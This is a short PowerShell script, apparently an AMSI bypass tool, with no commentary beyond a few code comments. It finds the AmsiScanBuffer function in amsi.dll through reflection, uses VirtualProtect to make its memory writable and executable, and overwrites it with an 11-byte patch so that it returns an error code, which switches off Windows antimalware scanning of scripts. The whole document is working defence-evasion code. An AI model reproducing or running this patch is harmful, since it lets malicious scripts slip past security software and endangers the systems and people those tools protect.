
#use native methods to lookup function addresses
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

#lookup AmsiScanBuffer address
$amsiScanBufferAddr = LookupFunc "amsi.dll" "AmsiScanBuffer"
if ($amsiScanBufferAddr -eq [IntPtr]::Zero) {
    Write-Error "Failed to get AmsiScanBuffer address"
    exit
}
#change memory protection to RWX
$result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($amsiScanBufferAddr, 8, 0x40, [ref]0)
if (-not $result) {
    Write-Error "Failed to change memory protection"
    exit
}

$Patch = [Byte[]] (0x41, 0x5F, 0x41, 0x5E, 0x5F, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$Address = [Int64]$amsiScanBufferAddr + 0x14
$new = [System.Runtime.InteropServices.Marshal]
$new::Copy($Patch, 0, $Address, 11)